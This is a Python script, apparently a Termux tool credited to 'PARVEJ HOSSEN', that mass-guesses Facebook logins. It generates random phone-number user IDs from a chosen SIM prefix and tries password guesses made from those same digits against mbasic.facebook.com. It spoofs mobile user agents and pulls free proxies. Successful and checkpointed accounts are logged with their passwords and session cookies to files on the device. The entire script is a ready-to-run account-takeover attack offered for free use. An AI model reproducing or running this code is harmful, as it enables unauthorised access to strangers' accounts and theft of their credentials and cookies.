
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('pkg install espeak')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen=[]
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12','13','14'])
	c='SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/'
	d=random.randrange(40,100)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	fullagent=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h}'
	ugen.append(fullagent)
os.system('xdg-open ')

logo = ("""
  \33[1;32m   ____  ___    ____ _    ________    __
   \33[1;33m / __ \/   |  / __ \ |  / / ____/   / /
 \33[1;31m  / /_/ / /| | / /_/ / | / / __/ __  / / 
  \33[1;34m/ ____/ ___ |/ _, _/| |/ / /___/ /_/ /  
\33[1;32m /_/   /_/  |_/_/ |_| |___/_____/\____/             
                                                                  
 \033[1;32m===============================================
     \x1b[1;96m Author       : \033[1;32m     PARVEJ HOSSEN
     \x1b[1;96m Facebook     :  \033[1;32m    FH ROMAN 
     \x1b[1;96m Tool Status  : \033[1;32m     FREE X ENJOY
     \x1b[1;96m Tool Work    :  \033[1;32m    ONLY DATA
     \x1b[1;96m Version      : \033[1;32m     2.1
 \033[1;32m===============================================
""")                                              

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        os.system('espeak -a 200 "Welcome parvej project Random Clone"')
        print(" \033[1;32m===============================================")
        print(" [01] RANDOM  NUMBER CLONE \033[1;34m[ULTRA WORKING ]")
        print(" [02] MY fACEBOOK ACCOUNT  \033[1;35m[FH ROMAN] ")
        print(" [00] Exit")
        print(" \033[1;32m===============================================")
        Alif =input(" [?] Choose : ")
        os.system('xdg-open ')
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
            os.system('xdg-open')
        if Alif in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    os.system('espeak -a 200 "Select your Number"')
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    os.system('espeak -a 200 "select Crack Limit"')
    limit = int(input(' [?] Crack Your Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as noob:
        os.system('clear')
        print(logo)
        os.system('espeak -a 200 "Random cloning Started PARVEJ"')
        tl = str(len(user))
        print("\033[1;32m================================================")
        print(' \033[1;34m[+] Total ids:\033[1;92m '+tl)
        print(' \033[1;33m[+] Process has been started')
        print(' \033[1;32m[+] Wait for ids ')
        print(' \033[1;35m[+] Use flight mode for speed up ')
        print("\033[1;32m=================================================")
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            noob.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mPARVEJ\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb ={'authority': 'mbasic.facebook.com',
   'method': 'GET',
   'scheme': 'https',
   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   'accept-encoding': 'gzip, deflate, br',
   'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
   'cache-control': 'max-age=0',
   'sec-ch-prefers-color-scheme': 'light',
   'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
   'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
   'sec-ch-ua-mobile': '?1',
   'sec-ch-ua-platform': '"Android"',
   'sec-ch-ua-platform-version': '"12.0.0"',
   'sec-fetch-dest': 'document',
   'sec-fetch-mode': 'navigate',
   'sec-fetch-site': 'none',
   'sec-fetch-user': '?1',
   'upgrade-insecure-requests': '1',
   'user-agent':pro}
  
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[PARVEJ-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[PARVEJ-CP😢] {uid}|{ps}")
                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[PARVEJ🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()